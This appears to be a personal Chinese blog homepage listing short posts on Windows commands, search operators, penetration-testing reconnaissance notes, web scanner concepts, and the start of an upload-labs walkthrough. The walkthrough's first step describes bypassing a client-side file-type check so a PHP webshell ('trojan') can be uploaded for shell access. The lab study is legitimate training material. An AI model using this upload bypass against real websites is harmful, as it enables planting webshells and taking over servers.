<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="Good habits are more important than hard work">
<meta property="og:type" content="website">
<meta property="og:title" content="hf1dw&#39;s blogs">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="hf1dw&#39;s blogs">
<meta property="og:description" content="Good habits are more important than hard work">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="hf1dw&#39;s blogs">
<meta name="twitter:description" content="Good habits are more important than hard work">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"right","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/"/>





  <title>hf1dw's blogs</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-right 
  page-home">
    <div class="headband"></div>
	<a href="https://github.com/hf1dw"><img width="100" height="100" src="https://github.blog/wp-content/uploads/2008/12/forkme_right_darkblue_121621.png?resize=149%2C149" class="attachment-full size-full" alt="Fork me on GitHub" data-recalc-dims="1"></a>
    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">hf1dw's blogs</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">studying,reading,thinking</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
            About
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/14/你好-hexo/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="hf1dw">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/blog-logo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hf1dw's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/09/14/你好-hexo/" itemprop="url">你好,hexo</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-14T09:49:46Z">
                2019-09-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/next/" itemprop="url" rel="index">
                    <span itemprop="name">next</span>
                  </a>
                </span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/next/blog搭建/" itemprop="url" rel="index">
                    <span itemprop="name">blog搭建</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h3 id="0x01-文本内容"><a href="#0x01-文本内容" class="headerlink" title="0x01 文本内容"></a>0x01 文本内容</h3><ul>
<li>这是一个测试文本</li>
<li>这是第二条内容
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2019/09/14/你好-hexo/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/14/生活/转眼间又已六月六/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="hf1dw">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/blog-logo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hf1dw's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/09/14/生活/转眼间又已六月六/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-14T08:08:13Z">
                2019-09-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <!DOCTYPE html>
<html lang="en">
  <head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>转眼间又已六月六</title>
    <style type="text/css" media="all">
      body {
        margin: 0;
        font-family: "Helvetica Neue", Helvetica, Arial, "Hiragino Sans GB", sans-serif;
        font-size: 14px;
        line-height: 20px;
        color: #777;
        background-color: white;
      }
      .container {
        width: 700px;
        margin-right: auto;
        margin-left: auto;
      }

      .post {
        font-family: Georgia, "Times New Roman", Times, "SimSun", serif;
        position: relative;
        padding: 70px;
        bottom: 0;
        overflow-y: auto;
        font-size: 16px;
        font-weight: normal;
        line-height: 25px;
        color: #515151;
      }

      .post h1{
        font-size: 50px;
        font-weight: 500;
        line-height: 60px;
        margin-bottom: 40px;
        color: inherit;
      }

      .post p {
        margin: 0 0 35px 0;
      }

      .post img {
        border: 1px solid #D9D9D9;
      }

      .post a {
        color: #28A1C5;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="post">
        <h1 class="title">转眼间又已六月六</h1>
        <div class="show-content">
          <p>* 生命里每个不曾起舞的日子，都是对生命的一种辜负。<br></p><p>* 去年的6.6正在学习html，现在的6.6早已将html忘得一干二净。</p><p>* 宅了一年的生活，给我感受莫过于低谷期的迷茫与面对未来的不知所措。</p><p>* 唯一的收获就是:每天都需要学习新的东西，把自己累得生不起懒惰的想法。</p><p>* 愿接下来的一年会越来越好，每天都有进步。</p><p>﻿</p><div class="image-package">
<img name="-1735174015-1559807796507" src="http://upload-images.jianshu.io/upload_images/9223646-265bd7c0e92f7393.gif?imageMogr2/auto-orient/strip%7CimageView2/2/w/1080/q/50"><br><div class="image-caption"></div>
</div><p>﻿</p><div class="image-package">
<img name="-1030548209-1559807796634" src="http://upload-images.jianshu.io/upload_images/9223646-2ee4a8ca9a8453fc.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1080/q/50"><br><div class="image-caption"></div>
</div>
        </div>
      </div>
    </div>
  </body>
</html>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/14/Windows/windows命令行常用命令/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="hf1dw">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/blog-logo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hf1dw's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/09/14/Windows/windows命令行常用命令/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-14T08:08:13Z">
                2019-09-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <ul>
<li><p>查看当前目录下的文件和文件夹：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接输入：dir</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看当前目录下的文件树</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接输入：tree</span><br></pre></td></tr></table></figure>
</li>
<li><p>磁盘切换</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接输入“盘符名” + “ : ”</span><br><span class="line">从C盘--&gt;D盘：输入 D:即可</span><br></pre></td></tr></table></figure>
</li>
<li><p>打开当前目录下的文件夹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd 文件夹名</span><br></pre></td></tr></table></figure>
</li>
<li><p>返回上一级目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ..</span><br><span class="line">//cd 与..之间留多少空格都没关系</span><br></pre></td></tr></table></figure>
</li>
<li><p>删除当前目录下某个文件夹内的所有文件<br>//(文件夹并未被删除掉)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">del 文件夹名</span><br><span class="line">del /F 文件夹名   //删除当前目录下某文件夹中的只读文件</span><br></pre></td></tr></table></figure>
</li>
<li><p>在当前目录下添加文件夹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md 文件夹名</span><br></pre></td></tr></table></figure>
</li>
<li><p>删除当前目录下的某个文件夹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rd 空文件夹名      //只能删除掉当前目录下的空文件夹</span><br><span class="line">rd /s 文件夹名     //可以删除某个非空文件夹</span><br></pre></td></tr></table></figure>

</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/14/Windows/windows快捷键/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="hf1dw">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/blog-logo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hf1dw's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/09/14/Windows/windows快捷键/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-14T08:08:13Z">
                2019-09-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <ul>
<li>Ctrl+W<br>关闭当前浏览网页</li>
<li>Ctrl+Shift+T<br>恢复之前关闭了的浏览网页</li>
<li>Windows+L<br>锁屏</li>
<li>Windows+D<br>显示桌面，再按一次，恢复</li>
<li>Windows+E<br>打开资源管理器，查找文件</li>
<li>Windows+M<br>收起所有窗口</li>
<li>Ctrl+Z<br>撤销键，编辑文本时也可使用</li>
<li>Windows+ =<br>放大镜</li>
<li>Ctrl+C/V<br>复制/粘贴</li>
<li>Ctrl+D<br>添加书签</li>
<li>Alt+Tab<br>切换窗口，通过Tab控制切换到哪个窗口</li>
<li>Ctrl+T<br>浏览器增加标签</li>
<li>Ctrl+(Tab | shift+Tab)<br>浏览器标签切换</li>
<li>Alt+F4<br>关闭当前窗口的所有标签</li>
<li>Alt+D<br>覆盖浏览器当前网址<br>详细了解：<a href="http://www.runoob.com/tags/html-keyboardshortcuts.html" target="_blank" rel="noopener">键盘快捷键</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/14/Web/搜索术/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="hf1dw">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/blog-logo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hf1dw's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/09/14/Web/搜索术/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-14T08:08:13Z">
                2019-09-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><strong>高级操作符</strong><br>//高级操作符与关键词之间不要留有空格。含有all的高级操作符不要与其他操作符一同使用，含all的高级操作符挺不友好的。</p>
<ul>
<li>Intitle与Allintitle<br>在页标题中搜索</li>
<li>Allintext<br>在网页内容里查找字符串</li>
<li>Inurl与Allinurl<br>在URL中查找文本</li>
<li>Site<br>把搜索精确到特定的站点</li>
<li>Filetype/ext<br>搜索指定类型的文件</li>
<li>Link<br>搜索与当前网页存在链接的网页</li>
<li>Inanchor<br>在链接文本中查找文本</li>
<li>Cache<br>显示网页的缓存版本</li>
<li>Numrange<br>搜索数字</li>
<li>Daterange<br>查找在某个特定日期范围内发布的网页</li>
<li>Info<br>显示谷歌的摘要信息</li>
<li>Related<br>显示相关站点</li>
<li>Author<br>搜索Groups中新闻组帖子的作者</li>
<li>Group<br>搜索group标题</li>
<li>Insubject<br>搜索google group主题行</li>
<li>Msgid<br>通过消息id来查找group帖子</li>
<li>Stocks<br>搜索股票信息</li>
<li>define<br>显示某个术语的定义</li>
<li>phonebook<br>搜索电话列表</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/14/Web/《网络攻防技术与实战》(一)/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="hf1dw">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/blog-logo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hf1dw's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/09/14/Web/《网络攻防技术与实战》(一)/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-14T08:08:13Z">
                2019-09-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <ul>
<li><p>Google高级搜索：google hacking</p>
</li>
<li><p><a href="http://www.internic.net/whois.html" target="_blank" rel="noopener">WHOIS查询网址</a></p>
</li>
<li><p>IP地址查询网站：</p>
<p>1、国内IP地址查询：<a href="https://www.ipip.net/ip.html" target="_blank" rel="noopener">纯真IP库</a></p>
<p>2、国外IP查询：<a href="https://www.maxmind.com/en/geoip2-city" target="_blank" rel="noopener">GeoIP city(GeoLite)</a></p>
</li>
<li><p>DNS/IP的WHOIS查询获取IP、电话–&gt;真实地址</p>
</li>
<li><p>渗透一般步骤：</p>
<p>web信息搜索与挖掘–&gt;DNS与IP查询–&gt;网络地址–&gt;目标网络拓扑结构–&gt;网络扫描–&gt;网络查点–&gt;确认网络的服务类型与版本</p>
</li>
<li><p>网络地址–&gt;目标网络拓扑结构：路由跟踪(tracert)</p>
</li>
<li><p>网络扫描目的：找出连接目标；探测获取主机类型；找出网络中存在的安全弱点。</p>
</li>
<li><p>网络扫描方式：</p>
<p>1、主机扫描：Ping命令（ICMP Ping、ACK Ping、SYN Ping）找出网段活跃主机</p>
<p>2、端口扫描：TCP端口(Connect扫描\SYN扫描)、UDP端口；找出主机开放的网络服务</p>
<p>3、操作系统与网络服务辨识：确定渗透攻击代码与配置</p>
<p>4、漏洞扫描：寻找渗透通道</p>
</li>
<li><p>拒绝式服务攻击：SYN Flooding扫描</p>
</li>
<li><p>协议栈指纹分析</p>
</li>
<li><p>漏洞库：</p>
<p>1、国内：<a href="http://www.cnnvd.org.cn/index.html" target="_blank" rel="noopener">CNNVD</a>、<a href="http://ics.cnvd.org.cn/" target="_blank" rel="noopener">CVVD</a></p>
<p>2、国外：<a href="https://cve.mitre.org/" target="_blank" rel="noopener">CVE</a>、<a href="http://bugtraq-team.com/" target="_blank" rel="noopener">Bugtraq</a>、<a href="https://nvd.nist.gov/" target="_blank" rel="noopener">NVD</a></p>
</li>
<li><p>网络服务旗标抓取：</p>
<p>1、通用网络服务；</p>
<p>2、类UNIX平台网络服务；</p>
<p>3、windows平台网络服务。</p>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/14/Web/《白帽子讲Web扫描》小结（一）/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="hf1dw">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/blog-logo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hf1dw's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/09/14/Web/《白帽子讲Web扫描》小结（一）/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-14T08:08:13Z">
                2019-09-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <ul>
<li>#####web扫描器的原理<br>通过分析HTTP(S)的请求和响应来发现安全问题和架构缺陷</li>
<li>#####web爬虫<br>一种按照一定的规则自动抓取万维网资源的程序或者脚本</li>
<li>#####URL完整格式解析<br>协议：//主机名[:端口]/路径/[;参数][?查询参数]#信息片段<br>eg:<a href="http://www.anquanbao.com:80/index.php?id=1#target" target="_blank" rel="noopener">http://www.anquanbao.com:80/index.php?id=1#target</a><br>协议：http<br>主机名：<a href="http://www.anquanbao.com" target="_blank" rel="noopener">www.anquanbao.com</a><br>端口：80<br>路径：index.php<br>查询参数:id=1<br>信息片段：target</li>
<li>#####网页的超链接<br>1、绝对URL的超链接：链接<strong>网络</strong>上的一个站点、网页或其他资源<br>2、相对URL的超链接：链接<strong>同一网站</strong>的资源<br>3、书签：链接同一网页的资源<br>eg:<br>绝对URL超链接：<br><a href="http://www.baidu.com/" target="_blank" rel="noopener"></a><br>相对URL超链接：<br><a href="index.html"></a><br>//以当前页面地址为基点形成超链接<br>index.html表示同一网站的新的页面<br><a href="#top"></a><br>同一页面的超链接，用户点击时会跳到同一页面的top位置</li>
<li>#####HTTP协议<br>1、HTTP请求<br>请求行、请求报头、请求正文<br>2、HTTP响应<br>响应行、响应报头、响应正文</li>
<li>#####HTTP认证<br>1、Basic认证：按照明文信息进行传递，易劫持<br>2、Digest认证（摘要式）：需要通过两次交互来完成<br>//都容易被劫持和监听</li>
<li>#####DNS本地缓存<br>1、将域名和ip的关系存储下来；分为浏览器缓存、系统缓存（浏览器缓存优先）<br>2、火狐浏览器缓存文件查看：<code>about:cache</code><br>谷歌浏览器缓存文件查看：<code>chrome://net-internals/#dns</code><br>//分别在对应的浏览器中输入<br>3、系统缓存查看：命令行窗口中输入ipconfig /displaydns</li>
<li>#####爬虫策略<br>1、广度优先策略<br>2、深度优先策略<br>3、最佳优先策略</li>
<li>#####页面跳转<br>1、客户端跳转<br>301跳转：永久性转移<br>302跳转：临时性跳转<br>2、服务端跳转<br>服务端在收到客户端的HTTP请求后，由于请求到的页面和实际处理请求的页面不同，服务端会在内部进行页面跳转。<br>//服务端跳转时，客户端只发送一次请求，浏览器的地址栏不会显示目标地址的URL；客户端跳转时，由于是两次请求，这时地址栏中会显示目标资源的URL。（客户端向服务端发出第一次请求并发生一次跳转，得到服务端的响应后根据响应提供的地址发出第二次请求并进行第二次跳转，最终地址栏的地址为第二次请求的地址）<br>参考链接：<a href="https://blog.csdn.net/null____/article/details/8070105" target="_blank" rel="noopener">小结：“服务器端跳转”和“客户端跳转”的区别</a></li>
<li>#####URL<br>1、URL间的关系<br>URL重复：完全一样<br>URL相似：除了参数值不一样外，其余都一样<br>URL包含：参数名包含<br>2、URL去重</li>
<li>哈希表去重<br>建立一个HASH表，在HASH表中查找新的URL是否存在，不存在就放进去，一直遍历完所有的URL</li>
<li><a href="https://baike.baidu.com/item/%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8/5384697?fr=aladdin" target="_blank" rel="noopener">布隆过滤器</a></li>
<li>#####页面相似算法<br>1、编辑距离:根据两个字符串由一个转成另一个所需要的最少编辑次数来比较两个页面间的相似度；<br>//一般来说，编辑距离越小，两个串间的相似度越大<br>2、Simhash：为每一个web文档通过hash的方式生成一个64位的字节指纹（特征字），根据特征字的海明距离是不是&lt;n(n一般为3)来判断两个文档的相似度。<br>//海明距离：两个合法代码对应位上编码的不同位数。<br>eg:10101和00110从第一位开始有5位不同，则海明距离为3.</li>
<li>#####链接<br>1、静态链接：扩展名主要为：rar、zip、ttf、png、gif<br>2、动态链接：扩展名主要为：html、shtml、do、asp、aspx、php、js</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/14/Web/upload-labs/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="hf1dw">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/blog-logo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hf1dw's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/09/14/Web/upload-labs/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-14T08:08:01Z">
                2019-09-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><em>文件上传的目的是通过上传.php文件，从而植入木马，然后通过菜刀进行连接，最终get shell</em></p>
<blockquote>
<p><img src="https://upload-images.jianshu.io/upload_images/9223646-68bff6eaf56073cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
</blockquote>
<p>####0x01 Pass-01</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file = document.getElementsByName(&apos;upload_file&apos;)[0].value;</span><br><span class="line">    if (file == null || file == &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    //定义允许上传的文件类型</span><br><span class="line">    var allow_ext = &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    //提取上传文件的类型</span><br><span class="line">    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    //判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123;</span><br><span class="line">        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>拦截方式：根据上传文件的后缀是否为.img格式来判断文件能否上传；</p>
</li>
<li><p>绕过方式：将木马伪装成.img文件，上传后burp拦截数据包，更改文件后缀为.php，再forward.</p>
</li>
</ul>
<p>####0x02 Pass-02</p>
